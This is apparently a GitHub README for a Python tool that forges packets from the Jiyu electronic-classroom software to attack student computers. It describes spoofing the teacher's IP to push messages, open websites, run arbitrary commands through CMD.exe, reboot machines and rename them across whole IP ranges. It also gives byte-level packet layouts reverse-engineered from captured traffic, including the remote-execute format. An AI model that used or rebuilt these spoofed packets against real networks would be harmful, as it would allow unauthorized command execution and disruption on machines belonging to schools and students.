# Jiyu_udp_attack

[![GitHub release](https://img.shields.io/github/release/weilycoder/Jiyu_udp_attack.svg)](https://github.com/weilycoder/Jiyu_udp_attack/releases/latest)

利用极域电子教室的 udp 包攻击学生机。

对这方面技术的了解来自 [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack/)。

## Environment

项目的 Python 为 3.13，即使经 PyInstaller 打包也对 Win 7 系统不太友好。未来可能向下兼容。

此外，为了移除 scapy 依赖，项目使用原始套接字进行请求，在大部分系统上可能需要管理员权限。

## Usage

你可以从 Python 导入 `Jiyu_udp_attack` 模块，也可以使用命令行 `python Jiyu_udp_attack`。

使用 `python Jiyu_udp_attack -h` 来获取帮助信息：

```
usage: Jiyu_udp_attack [-h] -s TEACHER_IP [-f TEACHER_PORT] -t TARGET [-p PORT] [-i IP_ID] (-m MESSAGE | -w WEBSITE | -c COMMAND |
                       -r [timeout [message] ...] | -n name name_id)

Jiyu Attack Script

options:
  -h, --help            show this help message and exit
  -s, --teacher-ip TEACHER_IP
                        Teacher's IP address
  -f, --teacher-port TEACHER_PORT
                        Teacher's port (default to random port)
  -t, --target TARGET   Target IP address
  -p, --port PORT       Port to send packets to (default: 4705)
  -i, --ip-id IP_ID     IP ID for the packet (default: random ID)
  -m, --message MESSAGE
                        Message to send
  -w, --website WEBSITE
                        Website URL to ask to open
  -c, --command COMMAND
                        Command to execute on the target
  -r, --reboot [timeout [message] ...]
                        Reboot the target machine, optionally with a timeout and message
  -n, --rename name name_id
                        Rename the target machine

Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/
```

其中目标 ip 的指定使用了 [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack/) 的创意，可以：

+ 指定具体 ip，如 `192.168.3.103`；
+ 指定 ip 范围，如 `192.168.3.100-150`；
+ 指定 ip 段，如 `192.168.3.0/24`。

最多指定 65536 个不同 ip。

## Jiyu API

记录抓包得到的极域 udp 包格式。

不记录包头信息，只记录 Data 格式。

子标题名是我自己起的。

### Message

用于教师端向学生端发送信息。

Data 区长 $954$。

| 长度  |                            内容                            |
| :---: | :--------------------------------------------------------: |
| $12$  |                 `444d4f43000001009e030000`                 |
| $16$  |                        随机二进制串                        |
| $28$  | `204e0000c0a86c019103000091030000000800000000000005000000` |
| $800$ |               信息内容，使用 `utf-16le` 编码               |
| $98$  |                  全 $0$ 段，可能是保留区                   |

### Rename

Data 区长 $96$。

| 长度 |                            内容                            |
| :--: | :--------------------------------------------------------: |
| $28$ | `47434d4e000001004400000066b1e4923f9a364a943a3da3bd976041` |
| $4$  |              *ID*，需要大于上一次提供的 *ID*               |
| $64$ |        新名称，以 `\x00` 结尾，使用 `utf-16le` 编码        |

由于新名称的结尾以 `\x00` 标记，因此在结尾后可以加入其他数据，不影响识别，也没有副作用。

注意，结尾标记 `\x00` 经 `utf-16le` 编码后变为 `\x00\x00`。

如果提供一个较大的 *ID*，会使教师端的重命名消息不在学生端提示。

### Execute

用于教师端在学生端远程执行命令。

Data 区长 $906$。

| 长度  |                             内容                             |
| :---: | :----------------------------------------------------------: |
| $12$  |                  `444d4f43000001006e030000`                  |
| $16$  |                         随机二进制串                         |
| $32$  | `204e0000c0a8e901610300006103000000020000000000000f00000001000000` |
| $512$ |             可执行程序位置，使用 `utf-16le` 编码             |
| $254$ |                执行参数，使用 `utf-16le` 编码                |
| $66$  |                          全 $0$ 段                           |
|  $1$  |       正常启动 `00`；最小化启动 `01`；最大化启动 `02`        |
| $13$  |                 `00000001000000000000000000`                 |

另外，脚本的 `-c` 功能实际上是使用参数 `f'/D /C "{args.command}"'` 打开程序 `CMD.exe`，这里参数使用 Python 的字符串格式化语法表示。

### Website

用于教师端在学生端远程打开网站。

Data 区变长，至少 $64$ 个字节。

|      长度       |                内容                |
| :-------------: | :--------------------------------: |
|       $8$       |         `444d4f4300000100`         |
|       $4$       |   $\mathrm{size}+36$，小端序编码   |
|      $16$       |            随机二进制串            |
|       $8$       |         `204e0000c0a8e901`         |
|       $4$       |   $\mathrm{size}+23$，小端序编码   |
|       $4$       |   $\mathrm{size}+23$，小端序编码   |
|      $16$       | `00020000000000001800000000000000` |
| $\mathrm{size}$ |     网址，使用 `utf-16le` 编码     |
|       $4$       |             全 $0$ 段              |

### Reboot

用于重启学生机。

Data 区长 $582$。

| 长度  |                           内容                           |
| :---: | :------------------------------------------------------: |
| $12$  |                `444d4f43000001002a020000`                |
| $16$  |                       随机二进制串                       |
| $27$  | `204e0000c0a8e9011d0200001d0200000002000000000000130000` |
|  $1$  |               立即重启 `01`；应用超时 `00`               |
|  $4$  |                   超时时间，小端序编码                   |
|  $8$  |                    `0100000000000000`                    |
| $256$ |                提示信息，`utf-16le` 编码                 |
| $258$ |                        全 $0$ 段                         |

## License

MIT 协议。
